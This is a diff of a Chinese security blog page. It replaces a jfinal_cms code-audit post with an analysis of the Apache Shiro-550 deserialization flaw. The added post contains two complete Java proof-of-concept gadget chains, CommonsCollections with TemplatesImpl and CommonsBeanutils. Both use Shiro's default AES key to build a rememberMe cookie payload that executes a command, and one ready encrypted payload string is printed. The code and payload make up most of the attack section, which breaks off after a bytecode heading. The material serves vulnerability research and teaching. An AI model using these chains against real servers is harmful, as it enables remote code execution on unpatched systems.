@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>java代码审计-jfinal_cms | 六月的雨</title>
-  <meta name="keywords" content=" Hexo , Markdown ">
-  <meta name="description" content="java代码审计-jfinal_cms | 六月的雨">
+  <title>六月的雨</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="inxedu_cms前言   因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。 第一次上手一个SSM框架的审计，主要学习一下审计的思路。主要参考自先知社区这篇文章：JAVA代码审计 | 因酷网校在线教育系统 - 先知社区 (aliyun.">
 <meta property="og:type" content="article">
@@ -702,41 +702,22 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-java代码审计-jfinal_cms" class="article article-type-post" itemscope itemprop="blogPost">
-    
-        <h1 class="article-title">java代码审计-jfinal_cms</h1>
+        <article id="post-Java反序列化-Shiro分析" class="article article-type-post" itemscope itemprop="blogPost">
     
     <div class="article-meta">
         
         
         
-        <span class="book">
-            <i class="iconfont icon-category"></i>
-            
-            
-            <a  data-rel="JAVA代码审计">JAVA代码审计</a>
-            
-        </span>
-        
-        
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color5">Hexo</a>
-            
-            <a class="color4">Markdown</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-09 17:21:39'>2021-12-04 14:12</time>
+            Created At : <time class="date" title='Updated At: 2021-12-30 16:45:32'>2021-12-14 16:18</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:379</span>
+        <span>Count:2.2k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -766,7 +747,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#jfinal-cms"><span class="toc-text">jfinal_cms</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-XSS"><span class="toc-text">0x01 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-4-7-1%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E8%A7%92%E8%89%B2%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97"><span class="toc-text">0x02 4.7.1版本SQL注入漏洞——角色搜索模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">0x03 后台任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Shiro550"><span class="toc-text">Java反序列化-Shiro550</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Shiro550%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">0x01 Shiro550漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%BD%BF%E7%94%A8-TemplatesImpl%E6%9E%84%E9%80%A0%E4%B8%8D%E5%90%AB%E6%95%B0%E7%BB%84%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget"><span class="toc-text">0x02 使用 TemplatesImpl构造不含数组的反序列化Gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Commons-Beanutils%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x03 Commons Beanutils利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%9F%BA%E4%BA%8ETomcat%E5%85%A8%E5%B1%80%E5%AD%98%E5%82%A8%E8%BF%9B%E8%A1%8C%E5%9B%9E%E6%98%BE%EF%BC%88%E4%BD%86shiro%E4%B8%8D%E5%87%BA%E7%BD%91%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%8F%AF%E9%80%9A%E8%BF%87%E5%9B%9E%E6%98%BE%E8%BF%9B%E8%A1%8C%E5%88%A4%E6%96%ADkey%E5%AD%98%E4%B8%8D%E5%AD%98%E5%9C%A8%EF%BC%89"><span class="toc-text">0x04 基于Tomcat全局存储进行回显（但shiro不出网情况下，可通过回显进行判断key存不存在）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-shiro721"><span class="toc-text">0x04 shiro721</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-text">0x04 权限绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-shiro%E6%A1%86%E6%9E%B6-key%E7%88%86%E7%A0%B4"><span class="toc-text">0x04 shiro框架 key爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="toc-text">0x05 总结</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -782,65 +763,320 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="jfinal-cms"><a href="#jfinal-cms" class="headerlink" title="jfinal_cms"></a>jfinal_cms</h1><p>使用框架：jfinal框架(ActiveRecord进行数据库操作)</p>
-<p>目录详情:</p>
-<p>api :</p>
-<p>​            constant:定义了异常常量</p>
-<p>​            controller:web层</p>
-<p>​            from:javabean</p>
-<p>​            interceptor:</p>
-<p>​            service</p>
-<p>​            util</p>
-<p>component:所有组件的父类</p>
-<p>jfinal:</p>
-<p>​            base:</p>
-<p>​            component:公共类</p>
-<p>​            template:模板</p>
-<p>modules:业务层</p>
-<p>​            admin：后台web层</p>
-<p>​            filemanager</p>
-<p>​            front：</p>
-<p>system:</p>
-<p>util:</p>
-<h2 id="0x01-XSS"><a href="#0x01-XSS" class="headerlink" title="0x01 XSS"></a>0x01 XSS</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/20201222130257-f4d23d12-4412-1.png" alt="20201222130257-f4d23d12-4412-1"></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/20201222130257-f4d23d12-4412-1.png"></p>
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞源码存在于E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\front\controller\PersonController.java</p>
-<p>找漏洞源码可以burp抓包，然后复制front/person到IDEA中全局搜索，搜到PersonController.java后，再搜save方法。就可以搜到目标方法了。</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204152207469.png" alt="image-20211204152207469"></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204152348702.png" alt="image-20211204152348702"></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204152413906.png" alt="image-20211204152413906"></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204160037257.png" alt="image-20211204160037257"></p>
-<p>源码大概意思：</p>
-<p>1.将提交数据Json化</p>
-<p>2.从session中获取user信息</p>
-<p>3.400行-416行判断提交密码是否正确</p>
-<p>4.426行model.update()对提交数据进行写入数据库，目前未对数据进行xss过滤</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204165039679.png" alt="image-20211204165039679"></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204165905186.png" alt="image-20211204165905186"></p>
-<p>使用了prepareStatement对sql语句进行预编译，所以不存在sql注入漏洞</p>
-<h2 id="0x02-4-7-1版本SQL注入漏洞——角色搜索模块"><a href="#0x02-4-7-1版本SQL注入漏洞——角色搜索模块" class="headerlink" title="0x02 4.7.1版本SQL注入漏洞——角色搜索模块"></a>0x02 4.7.1版本SQL注入漏洞——角色搜索模块</h2><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/55565210-007ed380-572c-11e9-80fb-15f7f0927f9d.png"></p>
-<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204171755671.png" alt="image-20211204171755671"></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204171819910.png" alt="image-20211204171819910"></p>
-<p>使用whereLike方法，并没有进行任何过滤</p>
-<p>下个版本已经被修复了，这里分析一下：</p>
-<p>这里使用checkSQLInject对非法字符进行过滤，所以不存在sql注入漏洞了</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204171440280.png" alt="image-20211204171440280"></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204171515405.png" alt="image-20211204171515405"></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204171529482.png" alt="image-20211204171529482"></p>
-<h2 id="0x03-后台任意文件读取"><a href="#0x03-后台任意文件读取" class="headerlink" title="0x03 后台任意文件读取"></a>0x03 后台任意文件读取</h2><p>版本影响：&lt;= v4.7.1</p>
-<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞触发点在 com/jflyfox/modules/admin/folder/FolderController.java</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211209171954415.png" alt="image-20211209171954415"></p>
-<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
-<li><p>登录后台</p>
-</li>
-<li><p>单击内容管理-栏目管理，修改模板路径，并保存。</p>
-<p><a target="_blank" rel="noopener" href="http://localhost:8080/jfinal_cms/admin/folder/list">http://localhost:8080/jfinal_cms/admin/folder/list</a></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/1553855373933-w331s" alt="img"></p>
-</li>
-<li><p>前台访问此部分。</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/1553855380054-w331s" alt="img"></p>
-</li>
+        <p>title: Java反序列化-Shiro分析<br>date: 2021-12-11 15:38:12<br>tags:</p>
+<ul>
+<li>Hexo</li>
+<li>Markdown<br>categories: Java安全</li>
+</ul>
+<h1 id="Java反序列化-Shiro550"><a href="#Java反序列化-Shiro550" class="headerlink" title="Java反序列化-Shiro550"></a>Java反序列化-Shiro550</h1><h2 id="0x01-Shiro550漏洞原理"><a href="#0x01-Shiro550漏洞原理" class="headerlink" title="0x01 Shiro550漏洞原理"></a>0x01 Shiro550漏洞原理</h2><p>1.1    漏洞原理：为了让浏览器或服务器重启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密<br>Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。</p>
+<pre><code>获取rememberMe值 -&gt; Base64解密 -&gt; AES解密 -&gt; 调用readobject反序列化操作
+</code></pre>
+<p>PS：Tomcat对类加载的处理，如果反序列化流中包含非java自身的数组，则会导致无法加载类的错误。所以我们没法使用Transformer数组。</p>
+<p>影响版本：&lt; 1.7.0</p>
+<h2 id="0x02-使用-TemplatesImpl构造不含数组的反序列化Gadget"><a href="#0x02-使用-TemplatesImpl构造不含数组的反序列化Gadget" class="headerlink" title="0x02 使用 TemplatesImpl构造不含数组的反序列化Gadget"></a>0x02 使用 TemplatesImpl构造不含数组的反序列化Gadget</h2><p>2.1    利用链：</p>
+<pre><code>HashMap.readObject
+    TiedMapEntry.hashCode
+    TiedMapEntry.getValue
+        LazyMap.get
+            InvokeTransformer.transformer
+                TemplatesImpl.newTransformer
+            TemplatesImpl.getTransletInstance
+            TemplatesImpl.defineTransletClasses
+</code></pre>
+<p>这里的shiro环境使用的是P牛的，使用的是maven很方便：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p>
+<p>2.2    POC：</p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonsCollectionsShiroTest &#123;
+
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    &#125;
+
+
+    public byte[] getPayload() throws Exception &#123;
+
+
+        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+
+        //动态创建一个静态代码块，内容是Runtime.getRuntime().exec(&quot;calc&quot;)
+        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
+        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
+        CtClass payload=classPool.makeClass(&quot;cmd&quot;);//创建一个新的public类
+        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
+        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); // 创建 static 代码块，并插入代码
+        byte[] bytes=payload.toBytecode();//将动态代码块转换字节码赋予给byte数组
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Field bytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        bytecodes.set(templates, new byte[][]&#123;bytes&#125;);
+
+
+
+        Field name = templates.getClass().getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;HelloTemplatesImpl&quot;);
+
+
+        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;getClass&quot;,null,null);//为什么
+        HashMap hashMap = new HashMap();
+        Map decorate = LazyMap.decorate(hashMap,invokerTransformer);
+
+
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,templates);
+
+        HashMap expMap = new HashMap();
+        expMap.put(tiedMapEntry,&quot;vavava&quot;);
+
+        decorate.clear();
+        Field iMethodName = invokerTransformer.getClass().getDeclaredField(&quot;iMethodName&quot;);
+        iMethodName.setAccessible(true);
+        iMethodName.set(invokerTransformer,&quot;newTransformer&quot;);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(expMap);
+        oos.close();
+
+        return barr.toByteArray();
+
+    &#125;
+&#125;
+</code></pre>
+<p>测试类：</p>
+<pre><code>public class Client2 &#123;
+    public static void main(String []args) throws Exception &#123;
+
+        byte[] payloads = new CommonsCollectionsShiroTest().getPayload();
+        AesCipherService aes = new AesCipherService();
+        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
+
+        ByteSource ciphertext = aes.encrypt(payloads, key);
+        System.out.printf(ciphertext.toString());
+    &#125;
+&#125;
+</code></pre>
+<p>运行测试类,复制字节码，启动shiro环境。构造数据包进行发包。</p>
+<p>字节码：</p>
+<pre><code>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
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214161935252.png" alt="image-20211214161935252"></p>
+<h2 id="0x03-Commons-Beanutils利用链"><a href="#0x03-Commons-Beanutils利用链" class="headerlink" title="0x03 Commons Beanutils利用链"></a>0x03 Commons Beanutils利用链</h2><p>3.1    利用链：</p>
+<pre><code>ObjectInputStream.readObject()
+  PriorityQueue.readObject()
+    PriorityQueue.heapify()
+      PriorityQueue.siftDown()
+            PriorityQueue.siftDownUsingComparator()
+                  BeanComparator.compare()
+                       PropertyUtils.getProperty()                                                                       TemplatesImpl.  getoutputproperties()
+                           TemplatesImpl.newTransformer()    
+                           TemplatesImpl.getTransletInstance()
+                           TemplatesImpl.defineTransletClasses()
+                           newInstance()
+                        Runtime.exec()
+</code></pre>
+<p>3.2    这里使用的是shiro自带的Commons Beanutils工具包。它提供了javabean的一些操作方法,比如getter、setter、compare等方法。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211219112526508.png" alt="image-20211219112526508"></p>
+<p>首先我们先认识一下两个类:</p>
+<p> 1.org.apache.commons.beanutils.PropertyUtils.getProperty</p>
+<p>让使用者可以直接调用任意JavaBean的getter方法。</p>
+<pre><code>PropertyUtils.getProperty(new Person(), &quot;name&quot;);
+</code></pre>
+<p>2.org.apache.commons.beanutils.BeanComparator</p>
+<p>BeanComparator 是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了<br>java.util.Comparator 接口。我们看它的compare方法：</p>
+<pre><code>public int compare( final T o1, final T o2 ) &#123;
+  if ( property == null ) &#123;
+    // compare the actual objects
+    return internalCompare( o1, o2 );
+ &#125;
+  try &#123;
+    final Object value1 = PropertyUtils.getProperty( o1, property );
+    final Object value2 = PropertyUtils.getProperty( o2, property );
+    return internalCompare( value1, value2 );
+ &#125;
+  catch ( final IllegalAccessException iae ) &#123;
+    throw new RuntimeException( &quot;IllegalAccessException: &quot; +
+iae.toString() );
+ &#125;
+  catch ( final InvocationTargetException ite ) &#123;
+    throw new RuntimeException( &quot;InvocationTargetException: &quot; +
+ite.toString() );
+ &#125;
+  catch ( final NoSuchMethodException nsme ) &#123;
+    throw new RuntimeException( &quot;NoSuchMethodException: &quot; +
+nsme.toString() );
+ &#125;
+&#125;
+</code></pre>
+<p>当this.property 为空时，对传入的两个对象进行Compare；如果 this.property 不<br>为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值，这是重点，我们要控制this.property不为空 ，从而去调用PropertyUtils.getProperty。</p>
+<p>那么有个疑问，为什么要去调用PropertyUtils.getProperty呢？</p>
+<p>因为，PropertyUtils.getProperty的作用是可以调用调用任意JavaBean的getter方法。所以我们可以去调用templatesImpl.getOutputProperties方法。getOutputProperties方法中调用了自己的newTransformer方法，从而触发后续的RCE。</p>
+<p>3.2    POC：</p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.beanutils.BeanComparator;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+public class CommonsBeanutilsShiroTest &#123;
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    &#125;
+
+
+    public byte[] getPayload() throws Exception &#123;
+
+
+        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+
+        //动态创建一个静态代码块，内容是Runtime.getRuntime().exec(&quot;calc&quot;)
+        ClassPool classPool=ClassPool.getDefault();
+        classPool.appendClassPath(AbstractTranslet);
+        CtClass payload=classPool.makeClass(&quot;cmd&quot;);
+        payload.setSuperclass(classPool.get(AbstractTranslet)); 
+       payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); 
+        byte[] bytes=payload.toBytecode();//将动态代码块转换字节码赋予给byte数组
+
+
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);
+        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;1&quot;);
+
+        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
+        setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);
+
+        // 生成序列化字符串
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        return barr.toByteArray();
+
+
+    &#125;
+&#125;
+</code></pre>
+<p>测试类：</p>
+<pre><code>public class Client2 &#123;
+    public static void main(String []args) throws Exception &#123;
+
+        byte[] payloads = new CommonsBeanutilsShiroTest().getPayload();
+        AesCipherService aes = new AesCipherService();
+        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
+
+        ByteSource ciphertext = aes.encrypt(payloads, key);
+        System.out.printf(ciphertext.toString());
+    &#125;
+&#125;
+</code></pre>
+<p>复现：运行测试类,复制字节码，启动shiro环境。构造数据包进行发包，成功触发计算器。</p>
+<p>字节码：</p>
